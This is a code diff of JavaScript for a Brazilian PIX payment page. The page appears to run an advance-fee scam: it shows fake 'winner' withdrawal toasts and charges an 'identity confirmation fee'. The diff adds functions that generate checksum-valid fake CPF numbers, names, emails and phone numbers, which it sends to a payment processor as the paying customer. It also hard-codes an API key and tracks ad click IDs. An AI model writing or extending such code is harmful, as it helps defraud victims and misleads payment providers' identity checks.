@@ -1,37 +1,79 @@
 document.addEventListener("DOMContentLoaded", () => {
     // ===== Railway (Purchase garantido S2S) =====
-    // Enquanto você não tiver Railway, deixe vazio que não faz nada.
-    const RAILWAY_URL = "https://pix-purchase-railway-zuckpay-production.up.railway.app";       // ex: "https://seuapp.up.railway.app"
-    const RAILWAY_API_KEY = "9aHgnfPRYaNx6QcBh3DFn05PiWP6t5WQ23";   // ex: "minha-chave-forte"
+    const RAILWAY_URL = "https://pix-purchase-railway-zuckpay-production.up.railway.app";
+    const RAILWAY_API_KEY = "9aHgnfPRYaNx6QcBh3DFn05PiWP6t5WQ23";
 
     function registrarPixNaRailway({ transactionId, pixCode, value }) {
         try {
-            // Railway ainda não configurada? não faz nada.
             if (!RAILWAY_URL || !RAILWAY_API_KEY) return;
-
             const clickid = (localStorage.getItem('click_id') || localStorage.getItem('clickid') || '').trim();
             if (!clickid || !transactionId) return;
-
             const payload = {
                 transactionId: String(transactionId),
                 clickid: String(clickid),
                 value: Number(value) || 0,
                 currency: "BRL",
-                pixCode: pixCode || null // opcional
+                pixCode: pixCode || null
             };
-
             fetch(`${RAILWAY_URL}/pix-created`, {
                 method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                    "x-api-key": RAILWAY_API_KEY
-                },
+                headers: { "Content-Type": "application/json", "x-api-key": RAILWAY_API_KEY },
                 body: JSON.stringify(payload),
                 keepalive: true
-            }).catch(() => { });
-        } catch (e) {
-            // silencioso de propósito
-        }
+            }).catch(() => {});
+        } catch (e) {}
+    }
+
+    // ===== Geradores de dados aleatórios válidos =====
+    function gerarCPF() {
+        const n = (i) => Math.floor(Math.random() * 9);
+        const n1 = n(), n2 = n(), n3 = n(), n4 = n(), n5 = n(), n6 = n(), n7 = n(), n8 = n(), n9 = n();
+        let d1 = (n1 * 10 + n2 * 9 + n3 * 8 + n4 * 7 + n5 * 6 + n6 * 5 + n7 * 4 + n8 * 3 + n9 * 2) % 11;
+        d1 = d1 < 2 ? 0 : 11 - d1;
+        let d2 = (n1 * 11 + n2 * 10 + n3 * 9 + n4 * 8 + n5 * 7 + n6 * 6 + n7 * 5 + n8 * 4 + n9 * 3 + d1 * 2) % 11;
+        d2 = d2 < 2 ? 0 : 11 - d2;
+        return `${n1}${n2}${n3}.${n4}${n5}${n6}.${n7}${n8}${n9}-${d1}${d2}`;
+    }
+
+    const NOMES = [
+        "Ana Clara Santos", "Bruno Oliveira", "Carla Souza Lima", "Daniel Pereira",
+        "Eduarda Costa", "Felipe Almeida", "Gabriela Martins", "Henrique Barbosa",
+        "Isabela Rocha", "João Pedro Carvalho", "Kamila Vieira", "Lucas Mendes",
+        "Marina Fernandes", "Natalia Ribeiro", "Otavio Correia", "Patricia Gomes",
+        "Rafael Moreira", "Sabrina Teixeira", "Thiago Cardoso", "Vanessa Araujo",
+        "Wagner Campos", "Yasmin Dias", "Adriano Nunes", "Beatriz Farias",
+        "Caio Monteiro", "Daniela Peixoto", "Erick Cavalcanti", "Fernanda Moura",
+        "Guilherme Vargas", "Helena Brandao"
+    ];
+
+    function gerarNome() {
+        return NOMES[Math.floor(Math.random() * NOMES.length)];
+    }
+
+    function gerarEmail(nome) {
+        const dominios = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br", "bol.com.br", "uol.com.br", "live.com"];
+        const limpo = nome.toLowerCase().replace(/\s/g, "").normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+        return `${limpo}${Math.floor(Math.random() * 9999)}@${dominios[Math.floor(Math.random() * dominios.length)]}`;
+    }
+
+    function gerarTelefone() {
+        const ddd = ["11", "21", "31", "41", "51", "61", "71", "81", "91", "12", "13", "14", "15", "16", "17", "18", "19"];
+        return `${ddd[Math.floor(Math.random() * ddd.length)]}9${Math.floor(Math.random() * 90000000 + 10000000)}`;
+    }
+
+    // ===== Gera dados aleatórios e salva no formulário =====
+    function preencherDadosAleatorios() {
+        const nome = gerarNome();
+        const cpf = gerarCPF();
+        const email = gerarEmail(nome);
+        const telefone = gerarTelefone();
+
+        localStorage.setItem('podpay_dados', JSON.stringify({ nome, cpf, email, telefone }));
+
+        const nomeEl = document.getElementById('confirm-nome');
+        const chaveEl = document.getElementById('confirm-chave');
+        if (nomeEl) nomeEl.innerText = nome;
+        if (chaveEl) chaveEl.innerText = cpf;
     }
 
     // --- 1. SELETORES DE ELEMENTOS ---
@@ -40,7 +82,6 @@ document.addEventListener("DOMContentLoaded", () => {
     const mainContent = document.getElementById('main-content');
     const btnGerarPix = document.getElementById('btn-gerar-pix');
 
-    // Seletores do Modal
     const modalPix = document.getElementById('modal-pix');
     const qrCodeImg = document.getElementById('qr-code-img');
     const inputPixCode = document.getElementById('pix-copia-cola');
@@ -62,11 +103,9 @@ document.addEventListener("DOMContentLoaded", () => {
         const toastImg = document.getElementById('toast-img');
         const toastMensagem = document.getElementById('toast-mensagem');
         if (!toast) return;
-
         const ganhador = listaGanhadores[Math.floor(Math.random() * listaGanhadores.length)];
         toastImg.src = ganhador.img;
         toastMensagem.innerHTML = `${ganhador.nome} sacou <strong class="texto-verde">${ganhador.valor}</strong>`;
-
         toast.classList.add('show');
         setTimeout(() => { toast.classList.remove('show'); }, 3000);
     }
@@ -126,18 +165,17 @@ document.addEventListener("DOMContentLoaded", () => {
 
     function carregarDadosUsuario() {
         const dados = JSON.parse(localStorage.getItem('dadosSaquePix')) || {};
+        const podpayDados = JSON.parse(localStorage.getItem('podpay_dados')) || {};
         const nomeEl = document.getElementById('confirm-nome');
         const tipoEl = document.getElementById('confirm-tipo');
         const chaveEl = document.getElementById('confirm-chave');
 
-        if (nomeEl) nomeEl.innerText = dados.nomeCompleto || "Não informado";
-        if (tipoEl) tipoEl.innerText = dados.tipoChave || "PIX";
-        if (chaveEl) chaveEl.innerText = dados.chavePix || "---";
+        if (nomeEl) nomeEl.innerText = podpayDados.nome || dados.nomeCompleto || "Não informado";
+        if (tipoEl) tipoEl.innerText = dados.tipoChave || "CPF";
+        if (chaveEl) chaveEl.innerText = podpayDados.cpf || dados.chavePix || "---";
     }
 
-    // --- 6. AÇÃO DE GERAR PAGAMENTO ---
-    const DUTTYFY_URL = 'https://www.pagamentos-seguros.app/api-pix/DsPjyrkANzHpZAOZ8AlEqAo7KYuIxhM7nEoWu6Ld0psP7F3UyuNSRuEJ3ELAy6j-BY7kkPKaf3jKYM7Sk_WPvA';
-
+    // --- 6. AÇÃO DE GERAR PAGAMENTO VIA PODPAY ---
     if (btnGerarPix) {
         btnGerarPix.addEventListener('click', function() {
             btnGerarPix.innerHTML = "<i class='bx bx-loader-alt bx-spin'></i> Gerando PIX...";
@@ -148,61 +186,71 @@ document.addEventListener("DOMContentLoaded", () => {
             var valorLimpo = parseFloat(taxaTexto.replace(/[^\d,]/g, '').replace(',', '.'));
             var amountCents = Math.round(valorLimpo * 100);
 
-            var urlParams = new URLSearchParams(window.location.search);
-            var dadosSalvos = JSON.parse(localStorage.getItem('dadosSaquePix')) || {};
+            var dadosAleatorios = JSON.parse(localStorage.getItem('podpay_dados'));
+            if (!dadosAleatorios) {
+                dadosAleatorios = {
+                    nome: gerarNome(),
+                    cpf: gerarCPF(),
+                    email: gerarEmail(gerarNome()),
+                    telefone: gerarTelefone()
+                };
+                localStorage.setItem('podpay_dados', JSON.stringify(dadosAleatorios));
+            }
 
-            var customerName = urlParams.get('name') || dadosSalvos.nomeCompleto || 'Ricardo Moreira';
-            var customerDocument = (urlParams.get('document') || dadosSalvos.chavePix || '76838727765').replace(/\D/g, '');
-            var customerEmail = urlParams.get('email') || dadosSalvos.email || 'ricardo.moreira8@live.com';
-            var customerPhone = (urlParams.get('phone') || dadosSalvos.telefone || '9990790242').replace(/\D/g, '');
+            var cpfNumeros = dadosAleatorios.cpf.replace(/\D/g, '');
+            var telefoneNumeros = dadosAleatorios.telefone.replace(/\D/g, '');
 
             var payload = {
                 amount: amountCents,
                 customer: {
-                    name: customerName,
-                    document: customerDocument,
-                    email: customerEmail,
-                    phone: customerPhone
+                    name: dadosAleatorios.nome,
+                    document: { type: "cpf", number: cpfNumeros },
+                    email: dadosAleatorios.email,
+                    phone: telefoneNumeros
                 },
-                item: {
-                    title: 'Taxa de confirmação de identidade',
-                    price: amountCents,
-                    quantity: 1
-                },
-                paymentMethod: 'PIX',
-                utm: window.location.search.replace(/^\?/, '')
+                items: [{
+                    title: "Taxa de confirmação de identidade",
+                    unitPrice: amountCents,
+                    quantity: 1,
+                    tangible: false
+                }]
             };
 
-            fetch(DUTTYFY_URL, {
+            fetch('/api/podpay', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                 body: JSON.stringify(payload)
             })
             .then(function(res) {
                 if (!res.ok) {
-                    return res.text().then(function(text) {
-                        throw new Error('API returned status ' + res.status + ' ' + res.statusText + ' - ' + text);
+                    return res.json().then(function(errData) {
+                        throw new Error((errData.error && errData.error.message) || 'Erro ao gerar PIX');
                     });
                 }
-                return res.json().catch(function(jsonErr) {
-                    return res.text().then(function(txt) {
-                        throw new Error('Resposta inválida (não JSON): ' + txt);
-                    });
-                });
+                return res.json();
             })
             .then(function(data) {
-                // aceitar chaves alternativas que a API possa retornar
-                var pixCode = (data && (data.pixCode || data.pix_code || data.pix_code_raw || data.code)) || null;
-                var transactionId = (data && (data.transactionId || data.transaction_id || data.txId)) || null;
+                if (!data.success || !data.data) {
+                    throw new Error(data.error?.message || 'Resposta inválida da API');
+                }
+
+                var transaction = data.data;
+                var pixCode = transaction.pixQrCode || null;
+                var transactionId = transaction.id || null;
+                var pixQrCodeImage = transaction.pixQrCodeImage || null;
 
                 if (!pixCode) {
-                    throw new Error((data && (data.message || data.error)) || 'Erro ao gerar PIX: resposta sem código');
+                    throw new Error('PIX não gerado: resposta sem código');
                 }
 
                 if (inputPixCode) inputPixCode.value = pixCode;
 
                 if (qrCodeImg) {
-                    qrCodeImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
+                    if (pixQrCodeImage) {
+                        qrCodeImg.src = pixQrCodeImage;
+                    } else {
+                        qrCodeImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
+                    }
                 }
 
                 registrarPixNaRailway({
@@ -226,18 +274,20 @@ document.addEventListener("DOMContentLoaded", () => {
 
                 if (transactionId) {
                     var verificarStatus = setInterval(function() {
-                        fetch(DUTTYFY_URL + '?transactionId=' + encodeURIComponent(transactionId))
-                            .then(function(r) {
-                                if (!r.ok) return null;
-                                return r.json().catch(function() { return null; });
-                            })
-                            .then(function(resStatus) {
-                                if (resStatus && resStatus.status === 'COMPLETED') {
-                                    clearInterval(verificarStatus);
-                                    setTimeout(function() { window.location.href = '/up1'; }, 500);
-                                }
-                            })
-                            .catch(function(err) { console.error('Erro na consulta de status:', err); });
+                        fetch('/api/podpay?id=' + encodeURIComponent(transactionId), {
+                            headers: { 'Accept': 'application/json' }
+                        })
+                        .then(function(r) {
+                            if (!r.ok) return null;
+                            return r.json().catch(function() { return null; });
+                        })
+                        .then(function(resStatus) {
+                            if (resStatus && resStatus.success && resStatus.data && resStatus.data.status === 'paid') {
+                                clearInterval(verificarStatus);
+                                setTimeout(function() { window.location.href = '/up1'; }, 500);
+                            }
+                        })
+                        .catch(function(err) { console.error('Erro na consulta de status:', err); });
                     }, 5000);
 
                     setTimeout(function() { clearInterval(verificarStatus); }, 15 * 60 * 1000);
@@ -269,6 +319,7 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     };
 
+    preencherDadosAleatorios();
     configurarValoresDinamicos();
     carregarDadosUsuario();
 });
